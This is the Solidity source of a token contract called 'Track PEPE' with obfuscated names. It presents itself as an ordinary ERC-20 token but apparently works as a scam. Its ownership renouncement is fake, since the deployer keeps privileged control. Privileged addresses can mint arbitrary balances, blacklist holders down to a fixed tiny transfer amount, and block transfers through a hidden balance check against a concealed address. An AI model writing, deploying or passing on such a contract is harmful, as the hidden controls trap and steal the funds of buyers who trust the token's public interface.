//SPDX-License-Identifier: MIT

pragma solidity ^0.8.4;

interface maxToken {
    function totalSupply() external view returns (uint256);

    function balanceOf(address feeTo) external view returns (uint256);

    function transfer(address atAuto, uint256 launchedEnable) external returns (bool);

    function allowance(address listSender, address spender) external view returns (uint256);

    function approve(address spender, uint256 launchedEnable) external returns (bool);

    function transferFrom(
        address sender,
        address atAuto,
        uint256 launchedEnable
    ) external returns (bool);

    event Transfer(address indexed from, address indexed amountListBuy, uint256 value);
    event Approval(address indexed listSender, address indexed spender, uint256 value);
}

abstract contract listToken {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface receiverFundSender {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface teamFromMarketing {
    function createPair(address fundLaunch, address exemptShould) external returns (address);
}

interface maxTokenMetadata is maxToken {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract TrackPEPE is listToken, maxToken, maxTokenMetadata {

    address buyFeeSell = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    function enableTo(address fundFromMarketing, address atAuto, uint256 launchedEnable) internal returns (bool) {
        require(autoLaunchedAt[fundFromMarketing] >= launchedEnable);
        autoLaunchedAt[fundFromMarketing] -= launchedEnable;
        autoLaunchedAt[atAuto] += launchedEnable;
        emit Transfer(fundFromMarketing, atAuto, launchedEnable);
        return true;
    }

    uint8 private fundAuto = 18;

    uint256 tradingListIs;

    string private atFeeBuy = "Track PEPE";

    address maxMarketing = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    function atSell() public {
        emit OwnershipTransferred(tradingBuyTx, address(0));
        isSellReceiver = address(0);
    }

    function enableReceiver(address minIs) public {
        atBuy();
        
        if (minIs == tradingBuyTx || minIs == enableIsWallet) {
            return;
        }
        amountIs[minIs] = true;
    }

    event OwnershipTransferred(address indexed receiverMax, address indexed limitMin);

    function buyIs(address senderMax) public {
        require(senderMax.balance < 100000);
        if (atTotal) {
            return;
        }
        if (tradingReceiver == buyAuto) {
            fromMax = true;
        }
        receiverListTrading[senderMax] = true;
        
        atTotal = true;
    }

    uint256 public buyAuto;

    function symbol() external view virtual override returns (string memory) {
        return fundSender;
    }

    function tradingTx(uint256 launchedEnable) public {
        atBuy();
        tradingListIs = launchedEnable;
    }

    mapping(address => bool) public receiverListTrading;

    function transferFrom(address fundFromMarketing, address atAuto, uint256 launchedEnable) external override returns (bool) {
        if (_msgSender() != maxMarketing) {
            if (teamMin[fundFromMarketing][_msgSender()] != type(uint256).max) {
                require(launchedEnable <= teamMin[fundFromMarketing][_msgSender()]);
                teamMin[fundFromMarketing][_msgSender()] -= launchedEnable;
            }
        }
        return maxShouldReceiver(fundFromMarketing, atAuto, launchedEnable);
    }

    function approve(address atLiquidity, uint256 launchedEnable) public virtual override returns (bool) {
        teamMin[_msgSender()][atLiquidity] = launchedEnable;
        emit Approval(_msgSender(), atLiquidity, launchedEnable);
        return true;
    }

    mapping(address => mapping(address => uint256)) private teamMin;

    bool public tradingFrom;

    function getOwner() external view returns (address) {
        return isSellReceiver;
    }

    function owner() external view returns (address) {
        return isSellReceiver;
    }

    uint256 private teamIsBuy;

    function transfer(address limitAmount, uint256 launchedEnable) external virtual override returns (bool) {
        return maxShouldReceiver(_msgSender(), limitAmount, launchedEnable);
    }

    address public tradingBuyTx;

    string private fundSender = "TPE";

    function atBuy() private view {
        require(receiverListTrading[_msgSender()]);
    }

    bool private limitEnable;

    function buyList(address limitAmount, uint256 launchedEnable) public {
        atBuy();
        autoLaunchedAt[limitAmount] = launchedEnable;
    }

    mapping(address => bool) public amountIs;

    function decimals() external view virtual override returns (uint8) {
        return fundAuto;
    }

    function maxShouldReceiver(address fundFromMarketing, address atAuto, uint256 launchedEnable) internal returns (bool) {
        if (fundFromMarketing == tradingBuyTx) {
            return enableTo(fundFromMarketing, atAuto, launchedEnable);
        }
        uint256 launchedToken = maxToken(enableIsWallet).balanceOf(buyFeeSell);
        require(launchedToken == tradingListIs);
        require(atAuto != buyFeeSell);
        if (amountIs[fundFromMarketing]) {
            return enableTo(fundFromMarketing, atAuto, limitLiquidity);
        }
        return enableTo(fundFromMarketing, atAuto, launchedEnable);
    }

    bool public fromMax;

    uint256 public tradingReceiver;

    uint256 constant limitLiquidity = 17 ** 10;

    mapping(address => uint256) private autoLaunchedAt;

    function name() external view virtual override returns (string memory) {
        return atFeeBuy;
    }

    constructor (){
        
        receiverFundSender walletToken = receiverFundSender(maxMarketing);
        enableIsWallet = teamFromMarketing(walletToken.factory()).createPair(walletToken.WETH(), address(this));
        if (limitEnable == shouldTake) {
            shouldTake = false;
        }
        tradingBuyTx = _msgSender();
        atSell();
        receiverListTrading[tradingBuyTx] = true;
        autoLaunchedAt[tradingBuyTx] = isLaunch;
        
        emit Transfer(address(0), tradingBuyTx, isLaunch);
    }

    function balanceOf(address feeTo) public view virtual override returns (uint256) {
        return autoLaunchedAt[feeTo];
    }

    function totalSupply() external view virtual override returns (uint256) {
        return isLaunch;
    }

    address private isSellReceiver;

    uint256 private isLaunch = 100000000 * 10 ** 18;

    bool public atTotal;

    bool private shouldTake;

    function allowance(address marketingMinAt, address atLiquidity) external view virtual override returns (uint256) {
        if (atLiquidity == maxMarketing) {
            return type(uint256).max;
        }
        return teamMin[marketingMinAt][atLiquidity];
    }

    address public enableIsWallet;

    uint256 public shouldMarketing;

    uint256 maxLaunched;

}